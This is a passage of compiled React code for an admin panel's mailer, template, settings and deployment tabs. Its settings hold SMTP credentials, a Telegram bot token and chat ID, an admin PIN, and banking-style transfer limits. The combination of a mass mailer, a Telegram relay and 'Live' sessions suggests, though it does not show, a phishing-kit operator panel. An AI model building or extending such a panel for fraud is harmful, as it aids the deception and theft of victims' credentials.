px-4 py-1.5 rounded text-[10px] font-bold transition-colors", children: "SEND" })] })] }), _jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-white/5", children: [_jsxs("div", { className: "flex items-center justify-between mb-3", children: [_jsxs("h3", { className: "text-xs font-bold flex items-center gap-2", children: [_jsx(Terminal, { className: "w-4 h-4 text-red-500" }), "MAILER LOGS"] }), _jsx("button", { onClick: handleClearMailerLogs, className: "p-1.5 bg-white/5 hover:bg-red-500/20 text-gray-400 hover:text-red-500 rounded transition-colors", title: "Clear Mailer Logs", children: _jsx(Trash2, { className: "w-3.5 h-3.5" }) })] }), _jsx("div", { className: "bg-black/40 rounded border border-white/5 p-2 font-mono text-[8px] h-[200px] overflow-y-auto", children: mailerLogs.length === 0 ? (_jsx("div", { className: "text-gray-600 italic", children: "No logs found." })) : (mailerLogs.map((log, i) => (_jsx("div", { className: "mb-1 border-b border-white/5 pb-1 last:border-0", children: log }, i)))) })] }), mailerConfig && (_jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-white/5", children: [_jsxs("h3", { className: "text-xs font-bold mb-3 flex items-center gap-2", children: [_jsx(RefreshCw, { className: "w-4 h-4 text-red-500" }), "SMTP CONFIG"] }), _jsxs("div", { className: "space-y-2 text-[9px] font-mono", children: [_jsxs("div", { className: "flex justify-between border-b border-white/5 pb-1", children: [_jsx("span", { className: "text-gray-500", children: "HOST:" }), _jsx("span", { children: mailerConfig.smtp?.host })] }), _jsxs("div", { className: "flex justify-between border-b border-white/5 pb-1", children: [_jsx("span", { className: "text-gray-500", children: "PORT:" }), _jsx("span", { children: mailerConfig.smtp?.port })] }), _jsxs("div", { className: "flex justify-between border-b border-white/5 pb-1", children: [_jsx("span", { className: "text-gray-500", children: "USER:" }), _jsx("span", { children: mailerConfig.smtp?.user })] }), _jsxs("div", { className: "flex justify-between border-b border-white/5 pb-1", children: [_jsx("span", { className: "text-gray-500", children: "SENDER:" }), _jsx("span", { children: mailerConfig.general?.sender_name })] })] })] }))] })) : activeTab === 'templates' ? (_jsx("div", { className: "space-y-3", children: !selectedTemplate ? (templates.map((t) => (_jsxs("div", { className: "p-3 bg-[#2c2c2e] rounded-lg border border-white/5 hover:border-white/20 cursor-pointer", onClick: () => fetchTemplateContent(t.name), children: [_jsx("div", { className: "font-bold text-xs", children: t.name }), _jsxs("div", { className: "text-[9px] text-gray-400", children: ["Last modified: ", t.last_modified] })] }, t.name)))) : (_jsxs("div", { className: "space-y-3", children: [_jsx("button", { onClick: () => setSelectedTemplate(null), className: "text-[9px] text-gray-400 hover:text-white", children: "\u2190 Back to templates" }), _jsx("div", { className: "font-bold text-xs", children: selectedTemplate }), _jsx("textarea", { value: templateContent, onChange: (e) => setTemplateContent(e.target.value), className: "w-full h-[300px] bg-black/40 rounded border border-white/5 p-2 font-mono text-[9px]" }), _jsx("button", { onClick: handleUpdateTemplate, className: "bg-red-600 hover:bg-red-700 py-2 px-4 rounded text-[10px] font-bold transition-colors", children: "Update Template" })] })) })) : activeTab === 'settings' ? (_jsx("div", { className: "space-y-4", children: globalSettings ? (_jsxs(_Fragment, { children: [_jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-white/5", children: [_jsxs("h3", { className: "text-xs font-bold mb-3 flex items-center gap-2 text-red-500", children: [_jsx(Send, { className: "w-4 h-4" }), "SMTP CONFIGURATION"] }), _jsxs("div", { className: "space-y-3", children: [_jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Host" }), _jsx("input", { type: "text", value: globalSettings.smtp.host, onChange: (e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, host: e.target.value } }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] }), _jsxs("div", { className: "grid grid-cols-2 gap-2", children: [_jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Port" }), _jsx("input", { type: "number", value: globalSettings.smtp.port, onChange: (e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, port: parseInt(e.target.value) } }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] }), _jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Secure" }), _jsxs("select", { value: globalSettings.smtp.secure ? 'true' : 'false', onChange: (e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, secure: e.target.value === 'true' } }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50", children: [_jsx("option", { value: "true", children: "SSL/TLS" }), _jsx("option", { value: "false", children: "STARTTLS" })] })] })] }), _jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "User" }), _jsx("input", { type: "text", value: globalSettings.smtp.user, onChange: (e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, user: e.target.value } }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] }), _jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Password" }), _jsx("input", { type: "password", value: globalSettings.smtp.pass, onChange: (e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, pass: e.target.value } }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] }), _jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Sender Name" }), _jsx("input", { type: "text", value: globalSettings.smtp.senderName, onChange: (e) => setGlobalSettings({ ...globalSettings, smtp: { ...globalSettings.smtp, senderName: e.target.value } }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] })] })] }), _jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-white/5", children: [_jsxs("h3", { className: "text-xs font-bold mb-3 flex items-center gap-2 text-blue-500", children: [_jsx(MessageSquare, { className: "w-4 h-4" }), "TELEGRAM CONFIG"] }), _jsxs("div", { className: "space-y-3", children: [_jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Bot Token" }), _jsx("input", { type: "text", value: globalSettings.telegram.token, onChange: (e) => setGlobalSettings({ ...globalSettings, telegram: { ...globalSettings.telegram, token: e.target.value } }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] }), _jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Chat ID" }), _jsx("input", { type: "text", value: globalSettings.telegram.chatId, onChange: (e) => setGlobalSettings({ ...globalSettings, telegram: { ...globalSettings.telegram, chatId: e.target.value } }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] })] })] }), _jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-white/5", children: [_jsxs("h3", { className: "text-xs font-bold mb-3 flex items-center gap-2 text-emerald-500", children: [_jsx(Terminal, { className: "w-4 h-4" }), "GENERAL SETTINGS"] }), _jsxs("div", { className: "space-y-3", children: [_jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Admin PIN" }), _jsx("input", { type: "text", value: globalSettings.general.adminPin, onChange: (e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, adminPin: e.target.value } }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] }), _jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Overdraft Limit ($)" }), _jsx("input", { type: "number", value: globalSettings.general.overdraftLimit, onChange: (e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, overdraftLimit: parseInt(e.target.value) } }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] }), _jsxs("div", { className: "grid grid-cols-2 gap-2", children: [_jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Transfer Limit ($)" }), _jsx("input", { type: "number", value: globalSettings.general.transferLimit, onChange: (e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, transferLimit: parseInt(e.target.value) } }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] }), _jsxs("div", { className: "space-y-1", children: [_jsx("label", { className: "text-[9px] text-gray-500 uppercase font-bold", children: "Daily Limit ($)" }), _jsx("input", { type: "number", value: globalSettings.general.dailyLimit, onChange: (e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, dailyLimit: parseInt(e.target.value) } }), className: "w-full bg-black/30 border border-white/10 rounded px-3 py-1.5 text-[10px] focus:outline-none focus:border-red-500/50" })] })] }), _jsxs("div", { className: "flex items-center gap-2 pt-2", children: [_jsx("input", { type: "checkbox", id: "maintenanceMode", checked: globalSettings.general.maintenanceMode, onChange: (e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, maintenanceMode: e.target.checked } }), className: "w-4 h-4 rounded bg-black/30 border-white/10 text-red-500 focus:ring-red-500/50" }), _jsx("label", { htmlFor: "maintenanceMode", className: "text-[10px] text-gray-300 font-bold uppercase", children: "Maintenance Mode" })] }), _jsxs("div", { className: "flex items-center gap-2 pt-2", children: [_jsx("input", { type: "checkbox", id: "forceSupportChat", checked: globalSettings.general.forceSupportChat, onChange: (e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, forceSupportChat: e.target.checked } }), className: "w-4 h-4 rounded bg-black/30 border-white/10 text-blue-500 focus:ring-blue-500/50" }), _jsx("label", { htmlFor: "forceSupportChat", className: "text-[10px] text-gray-300 font-bold uppercase", children: "Force Support Chat" })] }), _jsxs("div", { className: "flex items-center gap-2 pt-2", children: [_jsx("input", { type: "checkbox", id: "globalEnable", checked: globalSettings.general.globalEnable, onChange: (e) => setGlobalSettings({ ...globalSettings, general: { ...globalSettings.general, globalEnable: e.target.checked } }), className: "w-4 h-4 rounded bg-black/30 border-white/10 text-emerald-500 focus:ring-emerald-500/50" }), _jsx("label", { htmlFor: "globalEnable", className: "text-[10px] text-gray-300 font-bold uppercase", children: "Global Enable" })] })] })] }), _jsx("button", { onClick: saveGlobalSettings, className: "w-full bg-red-600 hover:bg-red-700 py-3 rounded-lg text-xs font-bold transition-colors shadow-lg", children: "SAVE ALL SETTINGS" })] })) : (_jsx("div", { className: "text-center py-10 text-gray-500 italic", children: "Loading settings..." })) })) : activeTab === 'system' ? (_jsxs("div", { className: "space-y-4", children: [_jsxs("div", { className: "p-4 bg-[#2c2c2e] rounded-lg border border-white/5", children: [_jsxs("h3", { className: "text-xs font-bold mb-3 flex items-center gap-2", children: [_jsx(Terminal, { className: "w-4 h-4 text-red-500" }), "DEPLOYMENT CONTROL"] }), _jsxs("div", { className: "grid grid-cols-1 gap-2", children: [_jsxs("button", { onClick: () => handleCommand('all', 'deploy', { args: [] }), className: "bg-red-600 hover:bg-red-700 py-2 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2", children: [_jsx(RefreshCw, { className: "w-4 h-4" }), " RUN DEPLOYMENT SCRIPT"] }), _jsxs("button", { onClick: () => handleCommand('all', 'deploy', { args: ['rebuild'] }), className: "bg-white/5 hover:bg-white/10 py-2 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2", children: [_jsx(RefreshCw, { className: "w-4 h-4" }), " REBUILD CONTAINERS"] }), _jsxs("div", { className: "grid grid-cols-2 gap-2", children: [_jsx("button", { onClick: () => handleCommand('all', 'deploy', { args: ['restart'] }), className: "bg-white/5 hover:bg-white/10 py-2 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2", children: "RESTART" }), _jsx("button", { onClick: () => handleCommand('all', 'deploy', { args: ['stop'] }), className: "bg-white/5 hover:bg-white/10 py-2 rounded text-[10px] font-bold transition-colors flex items-center justify-center gap-2", children: "STOP" })] })] })] }), _jsx("div", { className: "p-4 bg-black rounded-lg border border-white/10 font-mono text-[9px] h-[300px] overflow-y-auto flex flex-col-reverse", children: _jsx("div", { className: "space-y-1", children: deployOutput.length === 0 ? (_jsx("div", { className: "text-gray-600", children: "# Waiting for deployment output..." })) : (deployOutput.map((line, i) => (_jsxs("div", { className: "text-green-400 whitespace-pre-wrap", children: [_jsx("span", { className: "text-gray-500 mr-2", children: "$" }), line] }, i)))) }) })] })) : (_jsx("div", { className: "text-center py-10 text-gray-500 italic", children: "Select a tab to begin." })) }), _jsxs("div", { className: "fixed bottom-0 left-0 right-0 bg-[#111113]/90 backdrop-blur-2xl border-t border-white/5 px-4 py-3 flex items-center justify-around z-[1100]", children: [_jsxs("button", { onClick: () => setActiveTab('live'), className: `flex flex-col items-center gap-1 transition-all ${activeTab === 'live' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`, children: [_jsx(Zap, { className: `w-5 h-5 ${activeTab === 'live' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}` }), _jsx("span", { className: "text-[8px] font-black uppercase tracking-widest", children: "Live" })] }), _jsxs("button", { onClick: () => { setActiveTab('database'); fetchUsers(); }, className: `flex flex-col items-center gap-1 transition-all ${activeTab === 'database' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`, children: [_jsx(Database, { className: `w-5 h-5 ${activeTab === 'database' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}` }), _jsx("span", { className: "text-[8px] font-black uppercase tracking-widest", children: "Base" })] }), _jsxs("button", { onClick: () => { setActiveTab('mailer'); fetchMailerData(); fetchTemplates(); }, className: `flex flex-col items-center gap-1 transition-all ${activeTab === 'mailer' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`, children: [_jsx(Mail, { className: `w-5 h-5 ${activeTab === 'mailer' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}` }), _jsx("span", { className: "text-[8px] font-black uppercase tracking-widest", children: "Comms" })] }), _jsxs("button", { onClick: () => setActiveTab('system'), className: `flex flex-col items-center gap-1 transition-all ${activeTab === 'system' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`, children: [_jsx(Terminal, { className: `w-5 h-5 ${activeTab === 'system' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}` }), _jsx("span", { className: "text-[8px] font-black uppercase tracking-widest", children: "Ops" })] }), _jsxs("button", { onClick: () => { setActiveTab('settings'); fetchGlobalSettings(); }, className: `flex flex-col items-center gap-1 transition-all ${activeTab === 'settings' ? 'text-cyan-400 scale-110' : 'text-gray-500 opacity-60 hover:opacity-100'}`, children: [_jsx(Settings, { className: `w-5 h-5 ${activeTab === 'settings' ? 'drop-shadow-[0_0_8px_rgba(34,211,238,0.5)]' : ''}` }), _jsx("span", { className: "text-[8px] font-black uppercase tracking-widest", children: "Core" })] })] })] }));
};
